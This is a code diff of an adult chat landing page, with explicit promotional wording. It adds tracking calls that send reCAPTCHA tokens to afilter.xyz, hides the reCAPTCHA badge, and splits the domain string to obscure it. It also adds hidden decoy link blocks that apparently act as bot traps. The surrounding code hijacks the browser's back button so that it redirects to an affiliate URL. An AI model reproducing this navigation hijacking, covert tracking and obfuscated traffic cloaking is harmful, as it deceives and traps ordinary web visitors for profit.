@@ -11,26 +11,36 @@
         <meta content="" name="description">
         <link href="min.css" rel="stylesheet" type="text/css">
         <link href="css.css" rel="stylesheet" type="text/css">
-
+        <style>
+            .grecaptcha-badge{display:none}
+             .xj{display:none}
+        </style>
+        <script src='https://www.recaptcha.net/recaptcha/api.js?render=6LfOt3cUAAAAAMCmwEO6NoLzIGrsk1XvNRJQwooI'></script>
         <script>
-            (function () {
-
-                window.afilter = function (event) {
+           (function () {
+                window.afilter = function (event, detail, token) {
                     var xhr = new XMLHttpRequest();
                     xhr.open('POST', 'https://afilter.xyz/p/events', true);
                     xhr.withCredentials = true;
                     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                    xhr.send("et=" + event);
-
+                    xhr.send("et=" + event + "&v=" + detail + "&t=" + token);
                 };
 
+                window.atgo = function (url) {
+                    window.location.replace("https://" + 'afilter.xy' + 'z/' + url);
+                };
             }());
-            afilter(1)
+            grecaptcha.ready(function () {
+                grecaptcha.execute('6LfOt3cUAAAAAMCmwEO6NoLzIGrsk1XvNRJQwooI', {action: 'afilter'})
+                        .then(function (token) {
+                            afilter(6, null, token);
+                        });
+            });
             if (window.location.hash != "#t") {
                 pushHistory();
             }
             window.addEventListener("popstate", function (e) {
-                afilter(5);
+                afilter(5, null, null);
                 window.location.href = "https://secureconv-smart.com/?a=70580&c=130746";
             }, false);
 
@@ -173,26 +183,28 @@
                     <img alt="photo" class="popup-photo" src="animation.gif">
                     <p>Press the "Continue" button to get naughty chatting with SuperSpicy and browse more slutty girls!</p>
                     <div class="buttons-block">
-                        <a class="step-btn submit-btn tr-submit-button" data-id="agreeclick" href="https://afilter.xyz/d/1" id="agreeclick"  onclick="afilter(3)" target="top">Continue</a>
+                         <div class="xj">
+                            <a href="https://afilter.xyz/d/dpbbv10j46kgmiaceh17nr1nq3" >Click!</a>
+                            <a href="https://afilter.xyz/d/jql2rd6fkah461tsfjob59ale9" >Click!</a>
+                            <a href="https://afilter.xyz/d/425gjjtbp6cvajq79pk3kal3li" >Click!</a>
+                            <a href="https://afilter.xyz/d/9ro84m6gppm1q9ff3st4oigjoq" >Continue</a>
+                            <a href="https://afilter.xyz/d/krm59bgvt1bt5nb8cnhjpsph4e" >Continue</a>
+                        </div>
+                        <a class="step-btn submit-btn tr-submit-button" onclick="atgo('click');" >Continue</a>
+                        <div class="xj">
+                            <a href="https://afilter.xyz/d/dpbbv10j46kgmiaceh17nr1nq3" >Continue</a>
+                            <a href="https://afilter.xyz/d/jql2rd6fkah461tsfjob59ale9" >Continue</a>
+                            <a href="https://afilter.xyz/d/425gjjtbp6cvajq79pk3kal3li" >Continue</a>
+                            <a href="https://afilter.xyz/d/9ro84m6gppm1q9ff3st4oigjoq" >Continue</a>
+                            <a href="https://afilter.xyz/d/krm59bgvt1bt5nb8cnhjpsph4e" >Click!</a>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
-
-        <script>
-
-            var u1 = "https://afilter.xyz/d/1";
-            var u2 = "click";
-            u1 = u1.replace(/\/d\/1/, "");
-            var href = u1 + "/" + u2;
-            $("#agreeclick").attr("href", href)
-        </script>
         <script src="https://afilter.xyz/js/fraudclick.js?v=2"></script>
         <script>
             AtClickCheck(["input", "span", "img"], 3, 1);
         </script>
-
-
-
     </body>
 </html>
